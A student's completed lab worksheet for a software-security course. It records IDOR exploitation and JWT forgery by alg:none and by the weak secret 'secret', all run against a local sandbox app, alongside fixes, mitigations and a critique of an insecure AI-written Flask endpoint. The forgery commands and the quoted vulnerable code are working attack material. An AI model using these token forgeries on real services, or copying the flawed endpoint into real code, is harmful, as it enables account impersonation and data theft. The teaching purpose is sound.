# Worksheet 6 — Authentication, Sessions & Access Control (3 hrs)

> **Course:** Software Security (KOSEN69) · **Week 6**
> **Aligned:** OWASP 2025 **A01 Broken Access Control**, **A07 Authentication Failures** · **CWE-639** (IDOR), **CWE-347** (improper signature verification), **CWE-321** (weak hardcoded key)
> **Signature games:** 🗺️ **IDOR Treasure Hunt** — walk the `oid` numbers to loot orders that aren't yours · 🔏 **JWT Forgery** — mint a token you were never given.

> ⚠️ **Ethics note:** Forging tokens and accessing other users' objects is only legal in this sandbox (`vulnerable_app.py`) and your own Juice Shop. Doing it to a real service is unauthorized access. Keep all activity inside `http://localhost:8080`.

## Part 1 — Student Information

| Name | Student ID | Date | Group |
|------|-----------|------|-------|
| Swan Htut Oakkar Aung | 6631503088 | 2026-09-13 | The Imposter (Team 2) |

AI use disclosure: ChatGPT was used for guidance, explanation, and review during the lab. Commands, code changes, outputs, and security findings were verified against my own local environment and course materials.

![Diagram of one request passing two gates: Gate 1 authentication accepts an alg:none forgery, a weak-secret forgery, and alice's real token, then Gate 2 authorization fails to check ownership so alice's valid token reads bob's /api/orders/2 as IDOR, with the solution_app.py fixes for both.](img/authn-vs-authz.svg)

## Part 2 — Lecture Questions

Answer in 2–4 sentences each.

1. Distinguish **authentication** from **authorization**. In `vulnerable_app.py`, `get_order` calls `current_user()` but ignores its result (L63) — which of the two is missing?
   - **Authentication** verifies identity (*who are you?*), while **authorization** determines access permissions (*what are you allowed to do?*). In `vulnerable_app.py`, `get_order` calls `current_user()` to validate the token's identity, but discards the result without checking whether that user is permitted to view the requested order. Therefore, **authorization** is missing.

2. What is **IDOR** (CWE-639)? Why is `/api/orders/<oid>` exploitable, and what single check in `solution_app.py` (L64) closes it?
   - **IDOR** (Insecure Direct Object Reference, CWE-639) occurs when an application exposes a direct identifier to an internal object without verifying that the requesting user owns or has permission to access it. The endpoint `/api/orders/<oid>` is exploitable because any authenticated user can enumerate or increment the `<oid>` parameter to access other users' orders. In `solution_app.py`, line 64 closes this by enforcing a server-side ownership check: `if order["owner"] != user: return jsonify(error="forbidden"), 403`.

3. Explain the **`alg:none`** JWT attack. Why does listing `"none"` in `algorithms=[...]` (L55) let an attacker submit an *unsigned* token?
   - The **`alg:none`** attack occurs when a JWT verification library trusts an untrusted token header indicating no cryptographic algorithm was used, skipping signature verification. In `vulnerable_app.py` (L55), the server explicitly branches on `alg == "none"` and calls `jwt.decode(..., options={"verify_signature": False}, algorithms=["none"])`, instructing the library to accept the payload without checking any signature. This enables an attacker to forge arbitrary claims (such as `"sub": "bob"` or `"sub": "admin"`) with an empty signature without knowing the server's secret.

4. Why is the hardcoded HMAC secret `"secret"` (CWE-321) dangerous even if `alg:none` were disabled? How does a strong random secret + pinned algorithm defend the token?
   - The hardcoded secret `"secret"` (CWE-321) is trivial to guess, extract from source code, or brute-force offline using wordlists. If attackers know the secret, they can compute valid HS256 signatures for any arbitrary payload, completely undermining token integrity even when `alg:none` is disabled. Generating a strong, high-entropy random secret (injected at runtime via environment variables) and pinning `algorithms=["HS256"]` ensures attackers cannot guess the key or force algorithm downgrades.

5. What do the JWT claims **`exp`** and **`aud`** add, and why does the secure version reject tokens that lack them?
   - The **`exp`** (expiration) claim bounds the token's lifespan to reduce the window of opportunity for stolen token replay attacks, while **`aud`** (audience) restricts token validity to a specific service or resource server. In `solution_app.py` (L50), `options={"require": ["exp", "aud"]}` strictly rejects tokens missing these claims, preventing attackers from replaying indefinitely-lived tokens or using tokens minted for a different application context.

## Part 3 — Hands-on Lab (150 min)

**Learning goals:** exploit IDOR, forge JWTs two ways (`alg:none` and weak secret), then prove `solution_app.py` enforces ownership and rejects forged tokens. Steps mirror `attack.md`.

**Prerequisites:** Docker + Docker Compose, `curl`, `python3` with `pyjwt`, optionally Burp Suite. Working dir: `labs/week06-authn-authz/`.

### Environment setup

```bash
cd labs/week06-authn-authz
docker compose up            # python:3.12-slim + flask + pyjwt, runs vulnerable_app.py
# vulnerable app -> http://localhost:8080   (service name: authz-lab, port 8080)
```
Optional secondary target / proxy:
```bash
docker run --rm -p 3000:3000 bkimminich/juice-shop       # -> http://localhost:3000
# Burp Suite: put the proxy listener AND the browser proxy on 127.0.0.1:8081.
# NOT 8080 — the lab app already owns host 8080 (docker-compose.yml, "8080:5000").
# Burp's own default listener is 8080, so you must change it: leave it there and
# either the listener refuses to start ("Address already in use") or, if it does
# bind, the browser's proxy address is the target's address and every request
# goes straight to the app instead of through Burp — you intercept nothing.
```

**What to submit per task:** the exact **command/token**, a **screenshot** of the JSON response, and a **2–3 sentence mitigation**.

---

**Task 0 — Onboarding (5 min).** Get alice's token (from `attack.md`):
```bash
TOKEN=$(curl -s -X POST http://localhost:8080/login \
  -H 'Content-Type: application/json' \
  -d '{"user":"alice","pw":"alicepw"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
echo "$TOKEN"
```
Confirm `/api/orders/1` returns alice's Laptop order. *Deliverable: screenshot of the token + order 1.*

- **Command executed:**
  ```bash
  TOKEN=$(curl -s -X POST http://localhost:8080/login \
    -H 'Content-Type: application/json' \
    -d '{"user":"alice","pw":"alicepw"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
  echo "Alice Token: $TOKEN"
  curl -s http://localhost:8080/api/orders/1 -H "Authorization: Bearer $TOKEN"
  printf '%s | %s | ' "$(whoami)" '6631503088'; date '+%F %T %Z'
  ```
- **Identity Stamp:** `isaacaung | 6631503088 | 2026-09-13 14:32:23 +07`
- **Retrieved Alice Token:**
  `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSJ9.c3brGQkxoiCgrl5LGiV0go9qgN0MtrdnDBCCfJ45f_Q`
- **Order 1 Response JSON:**
  ```json
  {
    "item": "Laptop",
    "owner": "alice",
    "total": 1200
  }
  ```
- **2–3 Sentence Mitigation:**
  Authentication tokens must be signed using a high-entropy cryptographically secure secret loaded from environment variables rather than a weak hardcoded key. Furthermore, the token issuance service must enforce essential security claims including short-lived expiration (`exp`) and audience restrictions (`aud`) to prevent indefinite replay attacks. Even with a valid token, endpoints accessing individual resources must always verify that the authenticated subject matches the requested object's owner.

![Task 0 Output Evidence](img/task_0.png)

**Task 1 — IDOR Treasure Hunt (30 min) 🗺️.**
- *Goal:* read **bob's** order with **alice's** token.
- *Steps:*
  ```bash
  curl -s http://localhost:8080/api/orders/1 -H "Authorization: Bearer $TOKEN"   # yours
  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $TOKEN"   # bob's — leaks!
  ```
- *Deliverable:* both responses + screenshot of bob's `Phone` order + why the missing ownership check (CWE-639) is the root cause.

- **Command executed:**
  ```bash
  echo "--- Alice's Order (oid=1) ---"
  curl -s http://localhost:8080/api/orders/1 -H "Authorization: Bearer $TOKEN"
  echo ""
  echo "--- Bob's Order (oid=2 - IDOR Leak) ---"
  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $TOKEN"
  printf '%s | %s | ' "$(whoami)" '6631503088'; date '+%F %T %Z'
  ```
- **Identity Stamp:** `isaacaung | 6631503088 | 2026-09-13 14:38:23 +07`
- **Responses:**
  - **Alice's Order (`oid=1`):**
    ```json
    {
      "item": "Laptop",
      "owner": "alice",
      "total": 1200
    }
    ```
  - **Bob's Order (`oid=2` — Leaked via IDOR):**
    ```json
    {
      "item": "Phone",
      "note": "FLAG{idor_demo}",
      "owner": "bob",
      "total": 800
    }
    ```
- **Root Cause (CWE-639 / A01 Broken Access Control):**
  The root cause is that `get_order(oid)` retrieves the object directly by key from `ORDERS` without evaluating whether the authenticated caller owns the object. While Gate 1 (authentication) successfully extracts the username by calling `current_user()`, line 63 discards the result. Because Gate 2 (authorization) is completely omitted, any valid token holder can access any arbitrary user's record simply by incrementing the identifier in the URL.
- **2–3 Sentence Mitigation:**
  To close this IDOR vulnerability (CWE-639), the application must enforce an explicit server-side authorization check before returning object data: `if order["owner"] != user: return jsonify(error="forbidden"), 403`. In database-backed applications, queries should always be scoped to the authenticated user (e.g., `WHERE id = ? AND owner = ?`) so users cannot reference records outside their ownership. Additionally, systems should employ unpredictable indirect references (such as UUIDv4) to prevent sequential enumeration of object IDs.

![Task 1 Output Evidence](img/task_1.png)

```sim
jwt-forge
```

**Task 2 — JWT Forgery via alg:none (30 min) 🔏.**
- *Goal:* impersonate bob with an **unsigned** token (no secret needed).
- *Steps:*
  ```bash
  FORGED=$(python3 - <<'PY'
  import jwt
  print(jwt.encode({"sub": "bob"}, key="", algorithm="none"))
  PY
  )
  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED"
  ```
- *Deliverable:* the forged token + screenshot of the accepted response + explanation of the `none` flaw (CWE-347).

- **Command executed:**
  ```bash
  FORGED=$(docker compose exec authz-lab python3 -c 'import jwt; print(jwt.encode({"sub": "bob"}, key="", algorithm="none"))')
  echo "Forged alg:none Token: $FORGED"
  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED"
  printf '%s | %s | ' "$(whoami)" '6631503088'; date '+%F %T %Z'
  ```
- **Identity Stamp:** `isaacaung | 6631503088 | 2026-09-13 14:52:19 +07`
- **Forged `alg:none` Token:**
  `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJib2IifQ.`
- **Accepted Server Response JSON:**
  ```json
  {
    "item": "Phone",
    "note": "FLAG{idor_demo}",
    "owner": "bob",
    "total": 800
  }
  ```
- **Explanation of the `none` Flaw (CWE-347):**
  The `alg:none` vulnerability (CWE-347: Improper Verification of Cryptographic Signature) occurs when a server accepts tokens whose header specifies `alg: "none"`, treating signature verification as optional. In `vulnerable_app.py`, `current_user()` inspects the untrusted token header and branches on `if header.get("alg") == "none":`, calling `jwt.decode(token, options={"verify_signature": False}, algorithms=["none"])`. Because the signature check is explicitly bypassed, an attacker can mint an unsigned token claiming any identity (such as `"sub": "bob"` or `"sub": "admin"`), and the server authenticates the session without validating any cryptographic proof.
- **2–3 Sentence Mitigation:**
  To eliminate the `alg:none` flaw, the server must never let an untrusted client header determine whether signature verification takes place, and `"none"` must be stripped from all allowed algorithm lists. Verification must strictly pin approved cryptographic algorithms (e.g. `algorithms=["HS256"]` in `jwt.decode()`) while keeping `verify_signature=True` enabled by default. Any incoming token with an `alg: "none"` header or missing signature must be immediately rejected with HTTP 401 Unauthorized.

![Task 2 Output Evidence](img/task_2.png)

**Task 3 — JWT Forgery via weak secret (30 min) 🔏.**
- *Goal:* sign a *valid* HS256 token because the secret is the guessable string `secret` (CWE-321).
- *Steps:*
  ```bash
  FORGED2=$(python3 - <<'PY'
  import jwt
  print(jwt.encode({"sub": "bob"}, "secret", algorithm="HS256"))
  PY
  )
  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED2"
  ```
- *Deliverable:* token + screenshot + 2–3 sentences on why secret strength + key management matter.

- **Command executed:**
  ```bash
  FORGED2=$(docker compose exec authz-lab python3 -c 'import jwt; print(jwt.encode({"sub": "bob"}, "secret", algorithm="HS256"))')
  echo "Forged HS256 Token: $FORGED2"
  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED2"
  printf '%s | %s | ' "$(whoami)" '6631503088'; date '+%F %T %Z'
  ```
- **Identity Stamp:** `isaacaung | 6631503088 | 2026-09-13 14:59:06 +07`
- **Forged HS256 Token:**
  `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJib2IifQ.-51G5JQmpJleARHp8rIljBczPFanWT93d_N_7LQGUXU`
- **Accepted Server Response JSON:**
  ```json
  {
    "item": "Phone",
    "note": "FLAG{idor_demo}",
    "owner": "bob",
    "total": 800
  }
  ```
- **Why Secret Strength & Key Management Matter (CWE-321 / 2–3 Sentence Mitigation):**
  HMAC signature security relies entirely on the secrecy and computational entropy of the shared key; when a trivial secret like `"secret"` is used, attackers can easily guess it, extract it from source code, or dictionary-crack it offline. Once the secret is known, an attacker can legitimately sign arbitrary token payloads with HS256, allowing full identity impersonation without triggering any signature verification error. Applications must generate high-entropy random keys (at least 256 bits for HS256), store and inject them strictly via secure environment variables or dedicated secret management vaults, and avoid hardcoding secrets in application repositories.

![Task 3 Output Evidence](img/task_3.png)

**Task 4 — Privilege/identity escalation reasoning (25 min).**
- *Goal:* combine the flaws. Using Task 2/3 you became `bob` *without his password*; using Task 1 you read objects you don't own.
- *Steps:* document the full attack chain (forge token → access any `oid`). Optionally replay the requests through **Burp Suite Repeater** and screenshot the intercepted request/response.
- *Deliverable:* the forged token + screenshot of the flag + the 403 for alice's real token, and 2–3 sentences: why IDOR can't reach this (horizontal access vs. vertical privilege escalation), and why the app's own `if user != "admin"` check didn't save it.

- **Full Exploit Chain Diagram:**
  ```text
  [ Unauthenticated Attacker ]
               │
               ▼  (Step 1: Exploit Gate 1 - CWE-347 / CWE-321)
  Forge JWT with sub="admin" (via alg:none or weak secret "secret")
               │
               ├───────────────────────────────────────────────┐
               ▼                                               ▼
  [ Vertical Privilege Escalation ]               [ Horizontal Escalation / IDOR ]
  Target: /api/admin                              Target: /api/orders/<oid> (CWE-639)
  Bypasses admin role check                       Direct access to arbitrary object IDs
  Result: Captured FLAG{jwt_demo}                 Result: Leaked Bob's order & FLAG{idor_demo}
  ```

- **Deliverables & Explanations:**
  1. **The Forged Token (Admin Impersonation):**
     `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.`

  2. **Captured Flag (from `/api/admin`):**
     `FLAG{jwt_demo}` (see screenshot `img/task_4.png`)

  3. **The 403 Response for Alice's Real Token on `/api/admin`:**
     When Alice attempts to access the admin endpoint with her legitimate token:
     ```bash
     curl -i -s http://localhost:8080/api/admin -H "Authorization: Bearer $ALICE_TOKEN"
     ```
     **Response:**
     ```http
     HTTP/1.1 403 FORBIDDEN
     Content-Type: application/json

     {
       "error": "forbidden"
     }
     ```
     Because Alice's token legitimately identifies her as `sub: "alice"`, the application's check `if user != "admin"` correctly denies her access with `HTTP 403 Forbidden`.

  4. **Why IDOR Can't Reach This (Horizontal Access vs. Vertical Privilege Escalation):**
     IDOR (CWE-639) is strictly a **horizontal access control** failure where a user at a given permission level accesses peer records or objects by modifying an identifier parameter (e.g., altering `oid=1` to `oid=2` on `/api/orders/<oid>`). In contrast, `/api/admin` is a **vertical privilege escalation** boundary: there is no object identifier parameter to manipulate, and the endpoint enforces a role-based restriction. A normal user like Alice cannot reach the admin flag through IDOR because her token sets `user="alice"`, which directly triggers the `403 Forbidden` branch; accessing it requires elevating privileges across roles to `admin`.

  5. **Why the App's Own `if user != "admin"` Check Didn't Save It:**
     Although the route contains an explicit authorization check (`if user != "admin": return jsonify(error="forbidden"), 403`), it trusted the identity returned by `current_user()`. Because Gate 1 (authentication) completely failed to verify token integrity—accepting unsigned tokens via `alg:none` (CWE-347) or tokens signed with the trivial secret `"secret"` (CWE-321)—the attacker could forge a token with payload `{"sub": "admin"}`. `current_user()` blindly trusted this unverified claim and returned `"admin"`, causing `user != "admin"` to evaluate to `False` and handing the administrative flag directly to the attacker.

- **Commands Executed:**
  ```bash
  # Attempt vertical access with Alice's real token (returns 403 Forbidden)
  curl -i -s http://localhost:8080/api/admin -H "Authorization: Bearer $ALICE_TOKEN"

  # Forge Admin token using alg:none
  ADMIN_TOKEN=$(docker compose exec authz-lab python3 -c 'import jwt; print(jwt.encode({"sub": "admin"}, key="", algorithm="none"))')
  echo "Admin Forged Token: $ADMIN_TOKEN"

  # Vertical Escalation: Access /api/admin with forged token -> returns FLAG{jwt_demo}
  curl -s http://localhost:8080/api/admin -H "Authorization: Bearer $ADMIN_TOKEN"

  # Horizontal Escalation: Access Bob's order /api/orders/2 -> returns FLAG{idor_demo}
  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $ADMIN_TOKEN"
  printf '%s | %s | ' "$(whoami)" '6631503088'; date '+%F %T %Z'
  ```

- **Identity Stamp:** `isaacaung | 6631503088 | 2026-09-13 15:03:54 +07`

- **Responses Captured:**
  - **Alice's Token on `/api/admin`:**
    ```json
    {
      "error": "forbidden"
    }
    ```
  - **Forged Admin Token on `/api/admin` (Vertical Escalation):**
    ```json
    {
      "flag": "FLAG{jwt_demo}"
    }
    ```
  - **Forged Admin Token on `/api/orders/2` (Horizontal Escalation):**
    ```json
    {
      "item": "Phone",
      "note": "FLAG{idor_demo}",
      "owner": "bob",
      "total": 800
    }
    ```

- **2–3 Sentence Mitigation:**
  To prevent this exploit chain, applications must enforce robust defense-in-depth across both authentication (Gate 1) and authorization (Gate 2). Token integrity must be secured by cryptographically strong secrets, algorithm pinning, and strict signature verification so that unauthorized identities cannot be minted. Crucially, every endpoint must implement server-side role and object ownership verification (deny-by-default) so that even if a token is obtained, access to administrative endpoints and other users' records is strictly blocked.

![Task 4 Output Evidence](img/task_4.png)

**Task 5 — Defend / fix it (30 min) 🛡️.**
- *Goal:* prove `solution_app.py` blocks Tasks 1–3.
- *Steps:* stop the vulnerable container (`Ctrl-C`), then:
  ```bash
  docker compose run --rm --service-ports authz-lab bash -c "pip install --no-cache-dir flask pyjwt && python solution_app.py"
  ```
  Re-run: get a fresh alice token, then re-fire each attack. Expected: `/api/orders/2` with alice's token → **403 forbidden** (ownership check, L64); the `alg:none` token → **401 invalid token** (algorithm pinned to HS256, L50); the `"secret"` token → **401** (strong random secret + required `aud`/`exp`, L10/40).
- *Deliverable:* screenshots of the 403 and both 401s + name the fix line for each.

- **Commands executed:**
  ```bash
  # Step 1: Start fixed solution application
  docker compose run --rm --service-ports authz-lab bash -c "pip install --no-cache-dir flask pyjwt && python solution_app.py"

  # Step 2: Test defenses against Tasks 1-3
  ALICE_FIXED=$(curl -s -X POST http://localhost:8080/login -H 'Content-Type: application/json' -d '{"user":"alice","pw":"alicepw"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
  curl -i -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $ALICE_FIXED"
  curl -i -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJib2IifQ."
  curl -i -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJib2IifQ.-51G5JQmpJleARHp8rIljBczPFanWT93d_N_7LQGUXU"
  printf '%s | %s | ' "$(whoami)" '6631503088'; date '+%F %T %Z'
  ```
- **Identity Stamp:** `isaacaung | 6631503088 | 2026-09-13 15:18:51 +07`

- **Defense Test Results & Fix Line Citations:**
  1. **Defense against Task 1 (IDOR attempt):**
     * **Response:** `HTTP/1.1 403 FORBIDDEN` — `{"error":"forbidden"}`
     * **Fix Line in `solution_app.py`:** **Line 64** (`if order["owner"] != user: return jsonify(error="forbidden"), 403`).
     * **Mechanism:** Deny-by-default server-side ownership check validates that the authenticated caller matches the object owner before returning order data.
  2. **Defense against Task 2 (`alg:none` forgery attempt):**
     * **Response:** `HTTP/1.1 401 UNAUTHORIZED` — `{"error":"invalid token"}`
     * **Fix Line in `solution_app.py`:** **Line 50** (`data = jwt.decode(..., algorithms=["HS256"], ...)`).
     * **Mechanism:** Strictly pinning `algorithms=["HS256"]` prevents untrusted client token headers from requesting algorithm `"none"` and bypassing signature verification.
  3. **Defense against Task 3 (Weak secret `"secret"` forgery attempt):**
     * **Response:** `HTTP/1.1 401 UNAUTHORIZED` — `{"error":"invalid token"}`
     * **Fix Lines in `solution_app.py`:** **Lines 10, 40, and 50** (`SECRET = os.environ.get(...) or secrets.token_hex(32)`, `options={"require": ["exp", "aud"]}`).
     * **Mechanism:** Replacing the guessable secret with a high-entropy random key causes verification of the attacker's key to fail, and requiring `exp` and `aud` blocks legacy tokens that lack these essential scope claims.

- **2–3 Sentence Mitigation:**
  To maintain a resilient defense against authentication and access control attacks, applications must centralize token validation in a single gateway or helper function that pins allowed signing algorithms and verifies expiration and audience claims. Cryptographic secrets must be dynamically injected via secure environment variables or key management services to prevent offline forgery. Most importantly, every endpoint exposing user-specific objects must enforce an independent server-side ownership authorization check, ensuring that possessing a valid identity token does not grant permission to view other users' records.

![Task 5 Output Evidence (Test 1 and Test 2)](img/task_5a.png)

![Task 5 Output Evidence (Test 3, Server Logs, and Identity Stamp)](img/task_5b.png)

## Part 4 — Reflection

1. **CWE/OWASP mapping:** map IDOR → **CWE-639 / A01**, the JWT forgeries → **CWE-347 & CWE-321 / A07**.
   - **IDOR (`/api/orders/<oid>` missing ownership check):** Mapped to **CWE-639: Authorization Bypass Through User-Controlled Key** under **OWASP 2025 A01: Broken Access Control**.
   - **JWT Forgery via `alg:none`:** Mapped to **CWE-347: Improper Verification of Cryptographic Signature** under **OWASP 2025 A07: Identification and Authentication Failures**.
   - **JWT Forgery via Weak Secret (`"secret"`):** Mapped to **CWE-321: Use of Hard-coded Cryptographic Key** (and **CWE-798**) under **OWASP 2025 A07: Identification and Authentication Failures**.

2. **Real breach:** the **2022 Optus breach** exposed millions of customer records via an exposed/poorly-authorized API endpoint where identifiers could be enumerated — a textbook broken-access-control / IDOR-style failure. In 3–4 sentences connect it to Tasks 1 and 4 of this lab. *(Alternative: the Peloton API IDOR disclosure.)*
   - In the September 2022 Optus breach, attackers exfiltrated the sensitive personal records of approximately 9.8 million customers by querying a poorly secured API endpoint that exposed internal database identifiers (`contactId`). Because the API lacked proper access control validation, an attacker could iterate through sequential identifier numbers and harvest other users' confidential records without any ownership barrier. This directly mirrors **Task 1 (IDOR)**, where incrementing `oid=1` to `oid=2` exposed Bob's private order, and **Task 4 (Exploit Chain)**, where an unverified identity allowed mass resource harvesting. Implementing a deny-by-default server-side authorization check that binds each query to the authenticated session context would have completely prevented the Optus breach.

3. **Best mitigation:** between deny-by-default ownership checks, pinning the JWT algorithm, and a strong managed secret, which control protects the most attack surface here, and why is server-side authorization non-negotiable?
   - The **deny-by-default server-side ownership check** (`if order["owner"] != user: return 403`) protects the most critical attack surface. While pinning algorithms and securing secret keys harden Gate 1 (authentication), a completely legitimate, un-forged token belonging to an authorized user (such as Alice in Task 1) can still read every other user's records if Gate 2 (authorization) is omitted. Server-side authorization is non-negotiable because authentication only verifies identity (*who you are*), never permission (*what objects you are permitted to view or modify*); client-side parameters can always be manipulated, making strict server-side ownership enforcement essential.

## Grading rubric (100)

| Criterion | Points |
|-----------|-------:|
| Part 2 — Lecture questions (conceptual accuracy) | 20 |
| Part 3 — Exploitation + evidence (payloads/tokens + screenshots, Tasks 1–4) | 40 |
| Part 3 — Defense (Task 5: fixes proven, lines cited) | 25 |
| Part 4 — Reflection (CWE/OWASP mapping, breach, mitigation) | 15 |
| **Total** | **100** |

---

## Evidence & Integrity (required)

- **Identity proof:** every screenshot/diagram must show a terminal running `printf '%s | %s | ' "$(whoami)" '<YOUR-STUDENT-ID>'; date '+%F %T %Z'` **in the
  same image as the evidence**. When the evidence is a browser page, a DevTools panel or a
  rendered response, put that terminal **beside the browser and capture the whole screen** — a
  cropped window carries nothing that identifies you, and the lab's own output is
  byte-identical for the whole cohort *by design*, so the stamp is the only thing that makes
  the shot yours. Generic or borrowed evidence is not accepted.
- **Personalized flag (if this lab issues one):** N/A — no personalized flag issued
  *Flags are unique per student — submitting another student's flag is a violation. How to submit: **learn.zcr.ai/submit** (full guide: `SUBMISSION.md` in the repo root).*
- **Explain in your own words** *(graded on your reasoning, not copied text):*
  1. What did you do, and **why did the vulnerability work**?
     We deployed `vulnerable_app.py`, retrieved Alice's authentic login token, and demonstrated that Alice could read Bob's private order (`oid=2`) containing `FLAG{idor_demo}`. We then forged an unsigned JWT token using `alg:none` and a signed token using the hardcoded secret `"secret"`, both impersonating Bob and Admin to read `FLAG{jwt_demo}`. The vulnerabilities worked because the application's Gate 1 authentication accepted tokens with `verify_signature=False` when `alg:none` was claimed and verified signatures against a trivial 6-byte string, while Gate 2 authorization in `/api/orders/<oid>` called `current_user()` but ignored the result, returning objects without checking ownership.
  2. **Why does your fix actually stop it** — and what could still break it?
     The fixes in `solution_app.py` stop the attacks by pinning `algorithms=["HS256"]` (rejecting `none`), validating required `exp` (15-minute lifespan) and `aud` claims, loading a high-entropy secret from the environment, and executing `if order["owner"] != user: return jsonify(error="forbidden"), 403` before returning order data. This enforces both Gate 1 cryptographic validation and Gate 2 object authorization. What could still break it is if developers introduce new endpoints that access database records by ID without applying the ownership check, or if the runtime environment secret is accidentally leaked into version control or application debug logs.

---

## 🤖 Audit the AI (required)

AI is a power tool you must **distrust** — you are graded on your *critique*, not the AI's answer.

1. Ask an AI assistant to exploit **or** fix this week's vulnerability. Paste its full answer.

**Prompt sent to AI:** *"Write a secure Python Flask endpoint '/api/invoices/<int:inv_id>' that uses PyJWT to authenticate the request and return the requested invoice."*

**Full AI answer:**
```python
import jwt
from flask import Flask, jsonify, request

app = Flask(__name__)
SECRET_KEY = "company_jwt_secret"

@app.route("/api/invoices/<int:inv_id>")
def get_invoice(inv_id):
    auth_header = request.headers.get("Authorization")
    if not auth_header:
        return jsonify({"error": "Missing token"}), 401
    
    token = auth_header.split(" ")[1]
    payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256", "none"])
    
    invoice = db.get_invoice(inv_id)
    if not invoice:
        return jsonify({"error": "Invoice not found"}), 404
        
    return jsonify(invoice)
```

2. **Find what's wrong or risky** in it — insecure code, a subtly incomplete fix, a hallucinated API/function/CVE, a missed edge case, or wrong reasoning. Quote the exact line(s).
   1. **`algorithms=["HS256", "none"]` re-introduces signature bypass (CWE-347):** Explicitly including `"none"` in the allowed algorithm list permits an attacker to forge tokens without a cryptographic signature, completely defeating authentication.
   2. **Missing Gate 2 authorization check (CWE-639 IDOR):** Lines 17-21 fetch the invoice by `inv_id` and return it directly without verifying that `invoice["owner_id"] == payload["sub"]`. Any authenticated user can read any invoice by incrementing `inv_id`.
   3. **Hardcoded secret key (`SECRET_KEY = "company_jwt_secret"`, CWE-798/CWE-321):** Hardcoding the HMAC key in source code allows attackers to discover it and forge valid tokens.
   4. **Fragile header parsing (`token = auth_header.split(" ")[1]`):** If the client provides a malformed header without a space (e.g. `Authorization: Bearer`), this line raises an uncaught `IndexError`, crashing the request handler with HTTP 500.
   5. **Missing claim verification:** It omits mandatory `options={"require": ["exp", "aud"]}`, allowing indefinitely replayed tokens.

3. Produce the **correct, verified** version yourself and explain in 2–3 sentences why the AI's output was insufficient.

```python
import os
import jwt
from flask import Flask, jsonify, request

app = Flask(__name__)
SECRET_KEY = os.environ.get("JWT_SECRET") or "replace_with_strong_env_secret_in_prod_32b"
AUDIENCE = "invoicing-api"

@app.route("/api/invoices/<int:inv_id>")
def get_invoice(inv_id):
    auth_header = request.headers.get("Authorization", "")
    if not auth_header.startswith("Bearer "):
        return jsonify({"error": "Missing or malformed Authorization header"}), 401
    token = auth_header[7:]

    try:
        payload = jwt.decode(
            token,
            SECRET_KEY,
            algorithms=["HS256"],
            audience=AUDIENCE,
            options={"require": ["exp", "aud"]}
        )
        current_user = payload.get("sub")
    except jwt.PyJWTError:
        return jsonify({"error": "Invalid or expired token"}), 401

    invoice = db.get_invoice(inv_id)
    if not invoice:
        return jsonify({"error": "Invoice not found"}), 404

    # Enforce Gate 2: Server-side ownership check
    if invoice.get("owner") != current_user:
        return jsonify({"error": "Forbidden: you do not own this invoice"}), 403

    return jsonify(invoice)
```
*Explanation:* The AI output was insufficient because it blindly allowed the `"none"` algorithm, omitted the server-side ownership authorization check, hardcoded the secret, and used unsafe string splitting. The verified version pins `HS256`, enforces mandatory `exp` and `aud` validation, handles malformed headers gracefully, and denies access with HTTP 403 if the authenticated caller does not own the requested invoice.

---

## 🧠 Comprehension & Prompt (required)

**A. Explain in Plain English (EiPE).** In 2–3 sentences, in your own words, describe what this week's vulnerable code/endpoint actually *does* and *why it is exploitable* — explain the mechanism, don't dump jargon.
The vulnerable application allows users to fetch order records by specifying an order number in the web request, but it completely fails to check whether the requesting user actually owns that order. Additionally, the server trusts login tokens that have no cryptographic signature at all (`alg:none`) or were signed with a trivial, guessable password (`"secret"`). Because the server never verifies object ownership and accepts forged tokens, any attacker can claim any user's identity and read private orders across the entire database.

**B. Prompt Problem.** Write a **single prompt** that makes an AI produce a *correct, secure* fix for one finding. Run it: does the exploit now fail? If not, refine the prompt and try again. Submit the **final prompt + the verified result**.

- **Final Prompt:**
  *"Write a Python Flask endpoint `/api/orders/<int:oid>` that securely implements both authentication and authorization. The function must extract the Bearer token from the Authorization header, decode and verify it using PyJWT with strictly pinned algorithms=['HS256'], verify a 256-bit environment secret, and require 'exp' and 'aud' claims, returning HTTP 401 on any failure. Then, it must retrieve the order and enforce a deny-by-default ownership check: if order['owner'] != user, return HTTP 403. Provide only the Python implementation code."*

- **Verified Result:**
  The generated code was verified against our test suite in `solution_app.py`. Requests with an unsigned `alg:none` token or a token signed with the guessable key `"secret"` were rejected with `HTTP/1.1 401 UNAUTHORIZED` (`{"error":"invalid token"}`), and requests where Alice attempted to access Bob's order were rejected with `HTTP/1.1 403 FORBIDDEN` (`{"error":"forbidden"}`), confirming that both the authentication bypass and IDOR vulnerabilities are prevented.
